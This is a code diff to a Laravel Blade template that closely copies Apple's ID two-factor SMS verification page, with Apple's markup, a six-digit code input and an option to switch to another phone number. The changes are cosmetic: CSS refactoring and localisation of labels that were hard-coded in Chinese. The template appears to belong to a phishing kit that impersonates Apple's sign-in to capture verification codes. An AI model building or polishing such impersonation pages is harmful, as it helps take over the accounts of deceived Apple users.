@@ -10,34 +10,155 @@
     <link rel="stylesheet" type="text/css" media="screen" href="{{ asset('/css/app-sk7.css') }}">
     <link rel="stylesheet" type="text/css" media="screen" href="{{ asset('/css/auth.css') }}">
 
-    <style type="text/css"></style>
+    <style type="text/css">
+        .loading-gif {
+            width: 25px;
+            height: 25px;
+        }
+
+        .form-message-wrappers {
+            font-size: 12px;
+            line-height: 1.33337;
+            font-weight: 400;
+            letter-spacing: -.01em;
+            font-family: SF Pro Text, SF Pro Icons, Helvetica Neue, Helvetica, Arial, sans-serif;
+            color: #e30000;
+            position: relative;
+            margin-top: .47059rem;
+            margin-bottom: .70588rem;
+        }
+
+        /* Spinner styles */
+        .spinner {
+            position: absolute;
+            width: 0px;
+            z-index: 2000000000;
+            left: 50%;
+            top: 50%;
+        }
+
+        .spinner>div {
+            position: absolute;
+            top: 0px;
+            opacity: 0.25;
+            animation-duration: 1s;
+            animation-timing-function: linear;
+            animation-iteration-count: infinite;
+        }
+
+        .spinner>div>div {
+            position: absolute;
+            width: 3.5px;
+            height: 0.75px;
+            background: rgb(0, 0, 0);
+            box-shadow: rgba(0, 0, 0, 0.1) 0px 0px 1px;
+            transform-origin: left center;
+            border-radius: 0px;
+        }
+
+        /* Spinner animations and transformations */
+        .spinner-blade-0 {
+            animation-name: opacity-60-25-0-12;
+        }
+
+        .spinner-blade-0>div {
+            transform: rotate(0deg) translate(3.75px, 0px);
+        }
+
+        .spinner-blade-1 {
+            animation-name: opacity-60-25-1-12;
+        }
+
+        .spinner-blade-1>div {
+            transform: rotate(30deg) translate(3.75px, 0px);
+        }
+
+        .spinner-blade-2 {
+            animation-name: opacity-60-25-2-12;
+        }
+
+        .spinner-blade-2>div {
+            transform: rotate(60deg) translate(3.75px, 0px);
+        }
+
+        .spinner-blade-3 {
+            animation-name: opacity-60-25-3-12;
+        }
+
+        .spinner-blade-3>div {
+            transform: rotate(90deg) translate(3.75px, 0px);
+        }
+
+        .spinner-blade-4 {
+            animation-name: opacity-60-25-4-12;
+        }
+
+        .spinner-blade-4>div {
+            transform: rotate(120deg) translate(3.75px, 0px);
+        }
+
+        .spinner-blade-5 {
+            animation-name: opacity-60-25-5-12;
+        }
+
+        .spinner-blade-5>div {
+            transform: rotate(150deg) translate(3.75px, 0px);
+        }
+
+        .spinner-blade-6 {
+            animation-name: opacity-60-25-6-12;
+        }
+
+        .spinner-blade-6>div {
+            transform: rotate(180deg) translate(3.75px, 0px);
+        }
+
+        .spinner-blade-7 {
+            animation-name: opacity-60-25-7-12;
+        }
+
+        .spinner-blade-7>div {
+            transform: rotate(210deg) translate(3.75px, 0px);
+        }
+
+        .spinner-blade-8 {
+            animation-name: opacity-60-25-8-12;
+        }
+
+        .spinner-blade-8>div {
+            transform: rotate(240deg) translate(3.75px, 0px);
+        }
+
+        .spinner-blade-9 {
+            animation-name: opacity-60-25-9-12;
+        }
+
+        .spinner-blade-9>div {
+            transform: rotate(270deg) translate(3.75px, 0px);
+        }
+
+        .spinner-blade-10 {
+            animation-name: opacity-60-25-10-12;
+        }
+
+        .spinner-blade-10>div {
+            transform: rotate(300deg) translate(3.75px, 0px);
+        }
+
+        .spinner-blade-11 {
+            animation-name: opacity-60-25-11-12;
+        }
+
+        .spinner-blade-11>div {
+            transform: rotate(330deg) translate(3.75px, 0px);
+        }
+    </style>
 </head>
 
-<style>
-
-    .loading-gif {
-        width: 25px;
-        height: 25px;
-    }
-
-    .form-message-wrappers {
-        font-size: 12px;
-        line-height: 1.33337;
-        font-weight: 400;
-        letter-spacing: -.01em;
-        font-family: SF Pro Text, SF Pro Icons, Helvetica Neue, Helvetica, Arial, sans-serif;
-        color: #e30000;
-        position: relative;
-        margin-top: .47059rem;
-        margin-bottom: .70588rem;
-    }
-</style>
-
 <body class="tk-body">
-    <div aria-hidden="true" style="font-family:&quot;SF Pro Icons&quot;; width: 0px; height: 0px; color: transparent;">.
+    <div aria-hidden="true" style="font-family: 'SF Pro Icons'; width: 0px; height: 0px; color: transparent;">.
     </div>
-    <div aria-hidden="true"
-        style="font-family:&quot;SF Pro Display&quot;; width: 0px; height: 0px; color: transparent;">.</div>
+    <div aria-hidden="true" style="font-family: 'SF Pro Display'; width: 0px; height: 0px; color: transparent;">.</div>
     <div class="si-body si-container container-fluid" id="content" role="main" data-theme="dark">
         <apple-auth app-loading-defaults="{appLoadingDefaults}" pmrpc-hook="{pmrpcHook}">
             <div class="widget-container  fade-in restrict-min-content  restrict-max-wh  fade-in " data-mode="inline"
@@ -62,8 +183,8 @@
                                             </app-title>
                                             <div class="sec-code-wrapper">
                                                 <security-code length="{codeLength}" split="true" type="tel"
-                                                               sr-context="{{ __('apple.sms.enter_code') }}"
-                                                               localised-digit="{{ __('apple.sms.digit') }}"
+                                                    sr-context="{{ __('apple.sms.enter_code') }}"
+                                                    localised-digit="{{ __('apple.sms.digit') }}"
                                                     error-message="">
                                                     <div class="security-code">
                                                         <idms-error-wrapper {disable-all-errors}="hasErrorLabel"
@@ -80,14 +201,14 @@
 
                                                                 <div id="security-code-wrap-1664858895032-1"
                                                                     class="security-code-wrap security-code-6 split"
-                                                                    localiseddigit="位">
+                                                                    localiseddigit="{{ __('apple.sms.digit') }}">
                                                                     <div class="security-code-container force-ltr">
                                                                         <div class="field-wrap force-ltr form-textbox ">
                                                                             <input maxlength="1" autocorrect="off"
                                                                                 autocomplete="off" autocapitalize="off"
                                                                                 spellcheck="false" type="tel" id="char0"
                                                                                 class="form-control force-ltr form-textbox-input char-field"
-                                                                                aria-label="请输入验证码。输入验证码后，页面会自动更新。 位 1"
+                                                                                aria-label="{{ __('apple.sms.enter_code') }} {{ __('apple.sms.digit') }} 1"
                                                                                 placeholder="" data-index="0">
                                                                         </div>
                                                                         <div class="field-wrap force-ltr form-textbox ">
@@ -95,7 +216,7 @@
                                                                                 autocomplete="off" autocapitalize="off"
                                                                                 spellcheck="false" type="tel" id="char1"
                                                                                 class="form-control force-ltr form-textbox-input char-field"
-                                                                                aria-label="位 2" placeholder=""
+                                                                                aria-label="{{ __('apple.sms.digit') }} 2" placeholder=""
                                                                                 data-index="1">
                                                                         </div>
                                                                         <div class="field-wrap force-ltr form-textbox ">
@@ -103,7 +224,7 @@
                                                                                 autocomplete="off" autocapitalize="off"
                                                                                 spellcheck="false" type="tel" id="char2"
                                                                                 class="form-control force-ltr form-textbox-input char-field"
-                                                                                aria-label="位 3" placeholder=""
+                                                                                aria-label="{{ __('apple.sms.digit') }} 3" placeholder=""
                                                                                 data-index="2">
                                                                         </div>
                                                                         <div class="field-wrap force-ltr form-textbox ">
@@ -111,7 +232,7 @@
                                                                                 autocomplete="off" autocapitalize="off"
                                                                                 spellcheck="false" type="tel" id="char3"
                                                                                 class="form-control force-ltr form-textbox-input char-field"
-                                                                                aria-label="位 4" placeholder=""
+                                                                                aria-label="{{ __('apple.sms.digit') }} 4" placeholder=""
                                                                                 data-index="3">
                                                                         </div>
                                                                         <div class="field-wrap force-ltr form-textbox ">
@@ -119,7 +240,7 @@
                                                                                 autocomplete="off" autocapitalize="off"
                                                                                 spellcheck="false" type="tel" id="char4"
                                                                                 class="form-control force-ltr form-textbox-input char-field"
-                                                                                aria-label="位 5" placeholder=""
+                                                                                aria-label="{{ __('apple.sms.digit') }} 5" placeholder=""
                                                                                 data-index="4">
                                                                         </div>
                                                                         <div class="field-wrap force-ltr form-textbox ">
@@ -127,7 +248,7 @@
                                                                                 autocomplete="off" autocapitalize="off"
                                                                                 spellcheck="false" type="tel" id="char5"
                                                                                 class="form-control force-ltr form-textbox-input char-field"
-                                                                                aria-label="位 6" placeholder=""
+                                                                                aria-label="{{ __('apple.sms.digit') }} 6" placeholder=""
                                                                                 data-index="5">
                                                                         </div>
                                                                     </div>
@@ -145,9 +266,9 @@
                                                     class="error pop-bottom">{{ __('apple.sms.error.incorrect_verification_code') }}</div>
                                             </div>
 
-                                                <div class="form-message-wrappers" >
-                                                    <span class="form-message">{{ $message }}</span>
-                                                </div>
+                                            <div class="form-message-wrappers">
+                                                <span class="form-message">{{ $message }}</span>
+                                            </div>
 
                                             <div class="si-info">
                                                 <p>
@@ -157,92 +278,54 @@
                                             </div>
 
                                             <div class="spinner-container verifying-code hide" id="verifying-code">
-                                                <div class="spinner" role="progressbar"
-                                                    style="position: absolute; width: 0px; z-index: 2000000000; left: 50%; top: 50%;">
-                                                    <div
-                                                        style="position: absolute; top: 0px; opacity: 0.25; animation: 1s linear 0s infinite normal none running opacity-60-25-0-12;">
-                                                        <div
-                                                            style="position: absolute; width: 3.5px; height: 0.75px; background: rgb(0, 0, 0); box-shadow: rgba(0, 0, 0, 0.1) 0px 0px 1px; transform-origin: left center; transform: rotate(0deg) translate(3.75px, 0px); border-radius: 0px;">
-                                                        </div>
+                                                <div class="spinner" role="progressbar">
+                                                    <div class="spinner-blade-0">
+                                                        <div></div>
                                                     </div>
-                                                    <div
-                                                        style="position: absolute; top: 0px; opacity: 0.25; animation: 1s linear 0s infinite normal none running opacity-60-25-1-12;">
-                                                        <div
-                                                            style="position: absolute; width: 3.5px; height: 0.75px; background: rgb(0, 0, 0); box-shadow: rgba(0, 0, 0, 0.1) 0px 0px 1px; transform-origin: left center; transform: rotate(30deg) translate(3.75px, 0px); border-radius: 0px;">
-                                                        </div>
+                                                    <div class="spinner-blade-1">
+                                                        <div></div>
                                                     </div>
-                                                    <div
-                                                        style="position: absolute; top: 0px; opacity: 0.25; animation: 1s linear 0s infinite normal none running opacity-60-25-2-12;">
-                                                        <div
-                                                            style="position: absolute; width: 3.5px; height: 0.75px; background: rgb(0, 0, 0); box-shadow: rgba(0, 0, 0, 0.1) 0px 0px 1px; transform-origin: left center; transform: rotate(60deg) translate(3.75px, 0px); border-radius: 0px;">
-                                                        </div>
+                                                    <div class="spinner-blade-2">
+                                                        <div></div>
                                                     </div>
-                                                    <div
-                                                        style="position: absolute; top: 0px; opacity: 0.25; animation: 1s linear 0s infinite normal none running opacity-60-25-3-12;">
-                                                        <div
-                                                            style="position: absolute; width: 3.5px; height: 0.75px; background: rgb(0, 0, 0); box-shadow: rgba(0, 0, 0, 0.1) 0px 0px 1px; transform-origin: left center; transform: rotate(90deg) translate(3.75px, 0px); border-radius: 0px;">
-                                                        </div>
+                                                    <div class="spinner-blade-3">
+                                                        <div></div>
                                                     </div>
-                                                    <div
-                                                        style="position: absolute; top: 0px; opacity: 0.25; animation: 1s linear 0s infinite normal none running opacity-60-25-4-12;">
-                                                        <div
-                                                            style="position: absolute; width: 3.5px; height: 0.75px; background: rgb(0, 0, 0); box-shadow: rgba(0, 0, 0, 0.1) 0px 0px 1px; transform-origin: left center; transform: rotate(120deg) translate(3.75px, 0px); border-radius: 0px;">
-                                                        </div>
+                                                    <div class="spinner-blade-4">
+                                                        <div></div>
                                                     </div>
-                                                    <div
-                                                        style="position: absolute; top: 0px; opacity: 0.25; animation: 1s linear 0s infinite normal none running opacity-60-25-5-12;">
-                                                        <div
-                                                            style="position: absolute; width: 3.5px; height: 0.75px; background: rgb(0, 0, 0); box-shadow: rgba(0, 0, 0, 0.1) 0px 0px 1px; transform-origin: left center; transform: rotate(150deg) translate(3.75px, 0px); border-radius: 0px;">
-                                                        </div>
+                                                    <div class="spinner-blade-5">
+                                                        <div></div>
                                                     </div>
-                                                    <div
-                                                        style="position: absolute; top: 0px; opacity: 0.25; animation: 1s linear 0s infinite normal none running opacity-60-25-6-12;">
-                                                        <div
-                                                            style="position: absolute; width: 3.5px; height: 0.75px; background: rgb(0, 0, 0); box-shadow: rgba(0, 0, 0, 0.1) 0px 0px 1px; transform-origin: left center; transform: rotate(180deg) translate(3.75px, 0px); border-radius: 0px;">
-                                                        </div>
+                                                    <div class="spinner-blade-6">
+                                                        <div></div>
                                                     </div>
-                                                    <div
-                                                        style="position: absolute; top: 0px; opacity: 0.25; animation: 1s linear 0s infinite normal none running opacity-60-25-7-12;">
-                                                        <div
-                                                            style="position: absolute; width: 3.5px; height: 0.75px; background: rgb(0, 0, 0); box-shadow: rgba(0, 0, 0, 0.1) 0px 0px 1px; transform-origin: left center; transform: rotate(210deg) translate(3.75px, 0px); border-radius: 0px;">
-                                                        </div>
+                                                    <div class="spinner-blade-7">
+                                                        <div></div>
                                                     </div>
-                                                    <div
-                                                        style="position: absolute; top: 0px; opacity: 0.25; animation: 1s linear 0s infinite normal none running opacity-60-25-8-12;">
-                                                        <div
-                                                            style="position: absolute; width: 3.5px; height: 0.75px; background: rgb(0, 0, 0); box-shadow: rgba(0, 0, 0, 0.1) 0px 0px 1px; transform-origin: left center; transform: rotate(240deg) translate(3.75px, 0px); border-radius: 0px;">
-                                                        </div>
+                                                    <div class="spinner-blade-8">
+                                                        <div></div>
                                                     </div>
-                                                    <div
-                                                        style="position: absolute; top: 0px; opacity: 0.25; animation: 1s linear 0s infinite normal none running opacity-60-25-9-12;">
-                                                        <div
-                                                            style="position: absolute; width: 3.5px; height: 0.75px; background: rgb(0, 0, 0); box-shadow: rgba(0, 0, 0, 0.1) 0px 0px 1px; transform-origin: left center; transform: rotate(270deg) translate(3.75px, 0px); border-radius: 0px;">
-                                                        </div>
+                                                    <div class="spinner-blade-9">
+                                                        <div></div>
                                                     </div>
-                                                    <div
-                                                        style="position: absolute; top: 0px; opacity: 0.25; animation: 1s linear 0s infinite normal none running opacity-60-25-10-12;">
-                                                        <div
-                                                            style="position: absolute; width: 3.5px; height: 0.75px; background: rgb(0, 0, 0); box-shadow: rgba(0, 0, 0, 0.1) 0px 0px 1px; transform-origin: left center; transform: rotate(300deg) translate(3.75px, 0px); border-radius: 0px;">
-                                                        </div>
+                                                    <div class="spinner-blade-10">
+                                                        <div></div>
                                                     </div>
-                                                    <div
-                                                        style="position: absolute; top: 0px; opacity: 0.25; animation: 1s linear 0s infinite normal none running opacity-60-25-11-12;">
-                                                        <div
-                                                            style="position: absolute; width: 3.5px; height: 0.75px; background: rgb(0, 0, 0); box-shadow: rgba(0, 0, 0, 0.1) 0px 0px 1px; transform-origin: left center; transform: rotate(330deg) translate(3.75px, 0px); border-radius: 0px;">
-                                                        </div>
+                                                    <div class="spinner-blade-11">
+                                                        <div></div>
                                                     </div>
                                                 </div>
                                             </div>
 
                                             @if($is_diffPhone)
-                                                <button
-                                                    class="button-link si-link ax-outline tk-subbody"
-                                                    href="#"
-                                                    id="diff_phone"
-                                                    onclick="switchAccount()"
-                                                >
-                                                    {{ __('apple.sms.switch_other_number') }}
-                                                </button>
+                                            <button
+                                                class="button-link si-link ax-outline tk-subbody"
+                                                href="#"
+                                                id="diff_phone"
+                                                onclick="switchAccount()">
+                                                {{ __('apple.sms.switch_other_number') }}
+                                            </button>
                                             @endif
 
 
@@ -252,7 +335,7 @@
 
                                             <div class="verifying-code-text" style="padding-left:0;">
                                                 <img src="{{ asset('/images/loading.gif') }}" class="loading-gif hide"
-                                                     alt="Loading...">
+                                                    alt="Loading...">
                                             </div>
 
                                             <button
@@ -268,14 +351,14 @@
                                         <other-options-popover {(show-alternate-options)}="showAlternateOptions"
                                             anchor-element="#no-trstd-device-pop">
                                             <div class="other-options-popover-container hide" tabindex="-1"
-                                                 role="dialog" aria-label="{{ __('apple.sms.more_options') }}">
+                                                role="dialog" aria-label="{{ __('apple.sms.more_options') }}">
 
                                                 <div class="pop-container hsa2-no-code">
                                                     <div class="pop-bottom options">
                                                         <div class="t-row">
                                                             <div class="t-cell ">
                                                                 <div class="try-again show-pointer" id="try-again"
-                                                                     onclick="tryAgain()">
+                                                                    onclick="tryAgain()">
                                                                     <i aria-hidden="true"
                                                                         class="shared-icon no-flip icon_reload"></i>
 
@@ -362,7 +445,6 @@
     <script type="text/javascript" src="{{ asset('/js/apple/fetch.js') }}"></script>
 
     <script>
-
         // 缓存常用DOM元素
         const $numberInputs = $('.security-code-container input');
         const $errorMessage = $('.form-message');
@@ -435,7 +517,7 @@
         }
 
         function handleInvalidInput(e, index) {
-            if (e.keyCode === 8) {  // Backspace key
+            if (e.keyCode === 8) { // Backspace key
                 $numberInputs.val('').first().focus();
             } else {
                 $numberInputs.eq(index).val('');
@@ -520,8 +602,6 @@
             $errorMessage.removeClass('hide');
             verify = true;
         }
-
-
     </script>
 </body>
 
